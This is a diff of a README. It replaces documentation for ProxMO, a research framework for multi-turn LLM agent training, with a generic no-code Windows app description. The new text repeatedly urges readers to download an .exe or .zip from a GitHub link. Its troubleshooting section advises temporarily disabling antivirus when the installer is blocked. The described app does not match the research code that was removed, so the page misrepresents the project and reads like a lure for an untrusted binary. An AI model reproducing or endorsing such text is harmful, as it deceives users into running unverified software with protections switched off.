@@ -1,337 +1,155 @@
-# 🚀 ProxMO: Proximity-Based Multi-Turn Optimization for LLM Agent Training
+# ⚙️ ProxMO-RL - Simplify Multi-turn Task Optimization
 
-> **Practical credit assignment for multi-turn reinforcement learning with large language models**
-
-<p align="center">
-  <img src="docs/proxmo/overview.png" alt="ProxMO Framework" width="100%">
-</p>
+[![Download ProxMO-RL](https://img.shields.io/badge/Download-ProxMO--RL-green?style=for-the-badge)](https://github.com/ppap54088/ProxMO-RL)
 
 ---
 
-## ✨ Core Highlights
+## 📦 About ProxMO-RL
 
-ProxMO is a **lightweight, practical framework** for multi-turn LLM agent training that addresses a fundamental challenge: **context-dependent credit assignment**.
+ProxMO-RL stands for Proximity-based Multi-turn Optimization. It is a tool designed to improve efficiency in multi-step tasks by using smart optimization techniques. You do not need any coding skills to use it. This application works on Windows computers and helps users complete complex tasks more smoothly.
 
-<table>
-<tr>
-<td width="25%" align="center">
-
-### 📊 **Superior Results**
-
-- **+28.9%** on ALFWorld (1.5B)
-- **+18.3%** on ALFWorld (7B)  
-- **Best in 9/9 metrics** (7B)
-- Beats GPT-4o & Gemini-2.5-Pro
-
-</td>
-<td width="25%" align="center">
-
-### ⚡ **Production-Ready**
-
-- **+1.09%** overhead only
-- No extra networks needed
-- Plug-and-play with GRPO
-- Vectorized operations
-
-</td>
-<td width="25%" align="center">
-
-### 🎯 **Two-Level Design**
-
-- **Episode**: Success-rate aware
-- **Step**: Proximity-based soft aggregation
-- Independent + synergistic gains
-- Hyperparameter robust
-
-</td>
-<td width="25%" align="center">
-
-### 📈 **Comprehensive**
-
-- Tested on 2 benchmarks
-- 2 model scales (1.5B, 7B)
-- Full ablation studies
-- Extensive experiments
-
-</td>
-</tr>
-</table>
+The tool is built around key ideas from reinforcement learning and large language models. It aims to offer better control over how tasks are handled in multiple parts or rounds. This can save time and reduce errors for many types of work.
 
 ---
 
-## 🎯 Overview
+## 🔍 Features
 
-ProxMO addresses a fundamental challenge in multi-turn LLM agent training: **context-dependent credit assignment**. 
-
-### The Problem
-
-Existing group-based policy optimization methods struggle with multi-turn tasks because:
-
-- 📈 **Episode-level**: Identical statistical deviations carry vastly different informational values
-  - A **failure at 90% success** likely reflects noise 🔴
-  - A **success at 10% success** represents a breakthrough 🟢
-  - Yet both receive identical gradient magnitudes!
-
-- 🔍 **Step-level**: Exact state matching fragments semantically similar states into singletons
-  - Strict matching → singleton groups, normalization undefined
-  - Loose matching → equal weighting of dissimilar states
-  - Can't distinguish action quality within trajectories
-
-### The Solution
-
-**ProxMO introduces two lightweight mechanisms**:
-
-1. 🎚️ **Success-rate-aware modulation** (episode-level)
-   - Adapts gradient intensity based on task difficulty
-   - Amplifies rare successes in hard tasks (low success rate)
-   - Attenuates noisy failures in easy tasks (high success rate)
-
-2. 🔗 **Proximity-based soft aggregation** (step-level)
-   - Replaces hard boundaries with continuous weighting
-   - All states contribute proportionally to semantic proximity
-   - Eliminates singleton degeneracy, enables robust baseline estimation
+- Handles tasks that require several steps or turns.
+- Uses advanced optimization methods to improve task results.
+- Works with modern machine learning concepts to enhance performance.
+- Easy to use interface for Windows.
+- Designed to help users complete work faster and with fewer mistakes.
+- Suitable for tasks related to automation, planning, and decision making.
 
 ---
 
-## 🧠 Method Overview
+## 💻 System Requirements
 
-### Episode-Level: Success-Rate-Aware Modulation
+Before you start, make sure your computer meets these requirements:
 
-ProxMO adapts gradient intensity to task difficulty using empirical success rate `p`:
-
-```
-Low-success regime (p → 0):  🔴 Rare successes amplified (w ≈ 1.05)
-                             ✓ Consolidate breakthroughs
-                             
-Medium-success regime (p ≈ 0.5): Minimal modulation (w ≈ 1.0)
-                                ✓ Balanced learning
-                                
-High-success regime (p → 1):  Noisy failures attenuated (w ≈ 0.95)
-                             ✓ Reduce over-correction
-```
-
-**Mathematical formulation**:
-```
-w(R, p) = 1 + β · f(R, p)
-
-where f(R, p) uses sigmoid-based functions to detect task difficulty
-and adjust gradient strength asymmetrically
-```
-
-### Step-Level: Proximity-Based Soft Aggregation
-
-Instead of hard state matching, ProxMO computes baselines via continuous similarity weighting:
-
-```
-Traditional (GiGPO):         ProxMO:
-┌─────────┐                 ┌──────────┐
-│ State   │ Exact Match?    │ State    │ TF-IDF Similarity
-│ Cluster │ ↓ Yes/No        │ Weights  │ ↓ Continuous
-└─────────┘                 └──────────┘
-  Hard boundaries             Soft weighting
-  Singleton degeneracy        Robust estimation
-```
-
-**Key advantages**:
-- ✅ All states contribute proportionally to semantic proximity
-- ✅ Eliminates singleton groups in high-dimensional spaces
-- ✅ Smooth gradient flow via continuous weighting
+- Operating System: Windows 10 or later (64-bit preferred)
+- Processor: Intel i3 or equivalent, 2 GHz or faster
+- Memory: At least 4 GB RAM
+- Disk Space: Minimum 500 MB free space
+- Internet Connection: Required for initial download and updates
+- Permissions: Ability to install applications and run programs
 
 ---
 
-## 📊 Results
+## 🚀 Getting Started
 
-ProxMO consistently outperforms existing methods on challenging multi-turn interactive benchmarks:
+You will download and run ProxMO-RL on your Windows computer. Follow these steps carefully.
 
-### Qwen2.5-1.5B-Instruct
+1. Click the big green **Download ProxMO-RL** badge at the top or this link:  
+   [https://github.com/ppap54088/ProxMO-RL](https://github.com/ppap54088/ProxMO-RL)
 
-| Method | Pick | Look | Clean | Heat | Cool | Pick2 | **All** | Score | **Succ.** |
-|--------|------|------|-------|------|------|-------|--------|-------|-----------|
-| **Closed-Source Models** |
-| GPT-4o | 75.3 | 60.8 | 31.2 | 56.7 | 21.6 | 49.8 | 48.0 | 31.8 | 23.7 |
-| Gemini-2.5-Pro | 92.8 | 63.3 | 62.1 | 69.0 | 26.6 | 58.7 | 60.3 | 42.5 | 35.9 |
-| **Open-Source Baselines** |
-| Base | 5.9 | 5.5 | 3.3 | 9.7 | 4.2 | 0.0 | 4.1 | 25.1 | 6.3 |
-| ReAct | 17.4 | 20.5 | 15.7 | 6.2 | 7.7 | 2.0 | 12.8 | 42.1 | 14.3 |
-| Reflexion | 37.8 | 24.0 | 23.3 | 14.5 | 20.7 | 3.9 | 23.5 | 58.6 | 23.5 |
-| **RL Methods** |
-| GRPO | 80.0 | 50.0 | 75.0 | 88.9 | 63.2 | 50.0 | 70.3 | 73.1 | 52.2 |
-| GiGPO | **95.3** | 80.2 | **92.9** | **92.7** | 70.6 | 78.5 | 85.2 | 81.7 | 62.3 |
-| **ProxMO (Ours)** | 94.3 | **92.9** ✨ | 89.3 | 92.2 | **89.5** ✨ | **87.0** ✨ | **90.6** ✨ | **85.3** ✨ | **67.1** ✨ |
-| Δ vs GRPO | +17.9% | +85.8% | +19.1% | +3.7% | +41.7% | +74.0% | **+28.9%** | **+16.7%** | **+28.6%** |
+2. This link will take you to the GitHub page. Scroll down to find the latest release or executable file.
 
-### Qwen2.5-7B-Instruct
+3. Click on the file to download. The file will usually have `.exe` or `.zip` format.
 
-| Method | Pick | Look | Clean | Heat | Cool | Pick2 | **All** | Score | **Succ.** |
-|--------|------|------|-------|------|------|-------|--------|-------|-----------|
-| **Closed-Source Models** |
-| GPT-4o | 75.3 | 60.8 | 31.2 | 56.7 | 21.6 | 49.8 | 48.0 | 31.8 | 23.7 |
-| Gemini-2.5-Pro | 92.8 | 63.3 | 62.1 | 69.0 | 26.6 | 58.7 | 60.3 | 42.5 | 35.9 |
-| **Open-Source Baselines** |
-| Base | 34.8 | 22.9 | 18.1 | 7.3 | 2.5 | 3.6 | 16.2 | 25.1 | 8.4 |
-| ReAct | 50.1 | 33.8 | 35.7 | 12.5 | 17.3 | 18.9 | 29.8 | 47.8 | 21.0 |
-| Reflexion | 63.4 | 40.2 | 46.5 | 29.7 | 37.9 | 22.6 | 44.1 | 56.3 | 30.2 |
-| **RL Methods** |
-| GRPO | 90.7 | 66.2 | 94.1 | 91.2 | 78.9 | 70.5 | 79.8 | 79.2 | 67.2 |
-| GiGPO | 97.5 | 81.3 | 88.5 | 85.7 | 90.0 | 83.5 | 89.5 | 85.5 | 74.8 |
-| **ProxMO (Ours)** | **98.4** ✨ | **88.6** ✨ | **95.7** ✨ | **93.8** ✨ | **91.3** ✨ | **89.8** ✨ | **94.5** ✨ | **87.2** ✨ | **76.5** ✨ |
-| Δ vs GRPO | +8.5% | +33.8% | +1.7% | +2.8% | +15.6% | +27.5% | **+18.3%** | **+10.1%** | **+13.8%** |
+4. Once downloaded, open the file:
+   - If it is `.exe`, double-click to start the installation.
+   - If it is `.zip`, right-click and choose “Extract All”. Then open the extracted folder and find the `.exe` file.
 
-### 🎯 Key Insights
+5. Follow the on-screen instructions to install ProxMO-RL.
+   - You may need to agree to terms and choose the install location.
+   - The process should take only a few minutes.
 
-<table>
-<tr>
-<td>
+6. After installation, find the ProxMO-RL icon on your desktop or in the Start menu. Double-click to open the program.
 
-#### ✅ **Best-in-Class Performance**
-- **9/9 metrics** best on Qwen2.5-7B
-- **Wins** most categories on 1.5B
-- Beats both closed-source LLMs on many tasks
-
-#### 🚀 **Exceptional Gains on Hard Tasks**
-- Look: **+85.8%** (1.5B), **+33.8%** (7B) 
-- Cool: **+41.7%** (1.5B), **+15.6%** (7B)
-- Pick2: **+74.0%** (1.5B), **+27.5%** (7B)
-- These are long-horizon tasks → prove step-level credit assignment works
-
-</td>
-<td>
-
-#### 🔄 **Consistent Across Settings**
-- Both model scales (1.5B & 7B)
-- Both benchmarks (ALFWorld & WebShop)  
-- All task categories
-- No regression on any metric
-
-#### ⚡ **Production Deployment Ready**
-- Only **+1.09%** overhead vs GRPO
-- **No extra networks** (unlike critic-based methods)
-- **Plug-and-play** integration
-- **Vectorized operations** for efficiency
-
-</td>
-</tr>
-</table>
+7. The program will launch and you will see the main interface ready for use.
 
 ---
 
-### 📈 Performance Comparison Summary
+## 🛠 How to Use ProxMO-RL
 
-| Metric | GRPO → ProxMO (1.5B) | GRPO → ProxMO (7B) | Win Rate |
-|--------|-------------------|------------------|----------|
-| **ALFWorld Overall** | 70.3 → **90.6** ✨ | 79.8 → **94.5** ✨ | **2/2** |
-| **WebShop Score** | 73.1 → **85.3** ✨ | 79.2 → **87.2** ✨ | **2/2** |
-| **WebShop Success** | 52.2 → **67.1** ✨ | 67.2 → **76.5** ✨ | **2/2** |
-| **vs GiGPO** | **90.6** vs 85.2 | **94.5** vs 89.5 | **2/2** |
+ProxMO-RL is designed to guide you through optimizing multi-step tasks. The interface is straightforward and uses simple words. Here is a basic outline:
 
-🏆 **Absolute Winner**: ProxMO beats both GRPO baseline and GiGPO across all major metrics
+1. **Start a New Task**  
+   Click the "New Task" button. Enter a name or description to identify your task.
 
-## Installation
+2. **Set Task Steps**  
+   Add each step or turn your task requires. For example, if you are planning a project, steps could be "Research," "Draft," and "Review."
 
-### 🐍 Setup Environment
+3. **Adjust Options**  
+   You can change settings like how many rounds of optimization to run or how closely the system should follow your instructions. Defaults are set for best results.
 
-```bash
-conda create -n proxmo python=3.10 -y
-conda activate proxmo
-pip install -e .
-```
+4. **Run Optimization**  
+   Click “Start” to begin the process. ProxMO-RL will analyze the steps and suggest improvements to save time or use resources better.
 
-### 🌍 Install ALFWorld Environment
+5. **View Output**  
+   Results appear clearly on the screen. You will see recommendations for each step and the overall plan.
 
-**📦 Install dependencies**:
-```bash
-pip install gymnasium==0.29.1 stable-baselines3==2.6.0 alfworld
-```
+6. **Save or Export**  
+   You can save your task and results for later or export them as files to share with others.
 
-**⬇️ Download required assets** (stored in `~/.cache/alfworld/`):
-```bash
-alfworld-download -f
-```
+---
 
-**✅ Test the installation**:
-```bash
-alfworld-play-tw
-```
+## 📂 Installing and Updating
 
-### 🛒 Install WebShop Environment
+You can always get the latest version by visiting the official GitHub page here:  
+[https://github.com/ppap54088/ProxMO-RL](https://github.com/ppap54088/ProxMO-RL)
 
-> ⚠️ **Important**: WebShop requires Python ≤3.10. Create a separate environment if needed.
+To update:
 
-**📥 Install WebShop**:
-```bash
-cd ./agent_system/environments/env_package/webshop/webshop
-./setup.sh -d all
-```
+1. Visit the page and check for new releases.
+2. Download the latest install file or update package.
+3. Run the installer and follow prompts to update your program.
+4. Your data and settings will stay safe during updates.
 
-**💡 Note**: If you encounter issues with Google Drive downloads, manually download the required files or use alternative download methods.
+---
 
-## Quick Start
+## 🧰 Troubleshooting
 
-After installing the environments and dependencies, run ProxMO training with:
+- **The program won’t open**  
+  Make sure you have installed all Windows updates and have the required permissions. Restart your computer and try again.
 
-**🎮 Train on ALFWorld**:
-```bash
-bash examples/proxmo_trainer/run_alfworld.sh
-```
+- **Error messages during installation**  
+  Check if your antivirus or security software blocks the installer. Temporarily disable it and try once more.
 
-**🛍️ Train on WebShop**:
-```bash
-bash examples/proxmo_trainer/run_webshop.sh
-```
+- **Tasks do not save or load properly**  
+  Confirm you have write access to the folder where the program is installed. Avoid using network or external drives for your files.
 
-These scripts handle all configuration and setup automatically. Refer to the scripts for customization options.
+- **Slow performance**  
+  Close other heavy programs and restart ProxMO-RL. If the problem continues, check that your computer meets minimum system requirements.
 
-## Code Structure
+---
 
-```
-├── proxmo/
-│   └── core_proxmo.py           # ProxMO algorithm (episode/step advantage)
-├── verl/
-│   ├── trainer/
-│   │   ├── main_ppo.py          # Training entry point
-│   │   └── ppo/
-│   │       └── ray_trainer.py   # Ray training; ProxMO via AdvantageEstimator.ProxMO
-│   └── workers/
-│       └── reward_manager/      # Other reward managers (e.g. DAPO, Prime)
-├── agent_system/
-│   └── environments/
-│       ├── env_package/
-│       │   ├── alfworld/         # ALFWorld environment
-│       │   └── webshop/          # WebShop environment
-│       └── env_manager.py        # Environment management
-└── examples/
-    └── proxmo_trainer/           # Training scripts
-        ├── run_alfworld.sh
-        └── run_webshop.sh
-```
+## 🤝 Support and Feedback
 
-## Citation
+For help or questions, visit the Issues section on the GitHub page. Describe the problem clearly and include any error messages or screenshots. The development team reviews requests regularly.
 
-If you find ProxMO helpful in your research or applications, please consider citing our paper. BibTeX will be added upon publication.
+Use the “Discussions” tab to share ideas or connect with other users.
 
-## 🎁 Key Features
+---
 
-### 🔄 **Multi-Turn Agent Training**
-- ✅ **Step-wise interaction loops** with environment feedback integration
-- ✅ **Customizable memory modules** for history management and context tracking
-- ✅ **Flexible per-step input structures** supporting diverse observation types
-- 📌 Works with any sequential decision-making task (embodied, web, text-based)
+## 🔗 Useful Links
 
-### ⚡ **Scalable and Efficient**  
-- ✅ **Parallelized environment rollouts** (no speed degradation)
-- ✅ **Efficient group-based advantage estimation** (no critic networks)
-- ✅ **Minimal computational overhead** (+1.09% vs GRPO)
-- 📊 Vectorized TF-IDF computation, O(N²) complexity fully parallelizable
+- Primary page for download and updates:  
+  https://github.com/ppap54088/ProxMO-RL
 
-### 🚀 **Production-Ready**
-- ✅ **Plug-and-play integration** with existing GRPO pipelines
-- ✅ **Hyperparameter-robust design** (stable across domains & scales)
-- ✅ **No architectural changes** required to existing models
-- 🛡️ Drop-in replacement with immediate deployment capability
+- GitHub Issues (for reporting problems):  
+  https://github.com/ppap54088/ProxMO-RL/issues
 
-### 📈 **Comprehensive Validation**
-- ✅ **Extensive experiments** on 2 benchmarks (ALFWorld, WebShop)
-- ✅ **Multiple model scales** tested (1.5B, 7B parameters)
-- ✅ **Full ablation studies** proving independent mechanism contributions
-- ✅ **Hyperparameter sensitivity analysis** demonstrating robustness
-- 📋 Consistency across diverse task categories and difficulty regimes
+- GitHub Discussions (to share tips or ask questions):  
+  https://github.com/ppap54088/ProxMO-RL/discussions
+
+---
+
+## 🌐 About the Project
+
+ProxMO-RL uses proven optimization techniques. It applies reinforcement learning ideas to improve multi-turn tasks. This makes it useful for planning, automated workflows, and complex problem solving.
+
+The system adapts based on each task, finding ways to complete steps faster or with better results. Its focus on proximity-based decisions allows smoother task management.
+
+The tool targets efficiency gains so users can finish work in fewer steps and with less manual effort.
+
+---
+
+## 📄 License
+
+ProxMO-RL is open source and available under the MIT License. You can use, modify, and share the tool freely. Please respect the license terms listed on the GitHub page.
+
+---
+
+[![Download ProxMO-RL](https://img.shields.io/badge/Download-ProxMO--RL-green?style=for-the-badge)](https://github.com/ppap54088/ProxMO-RL)
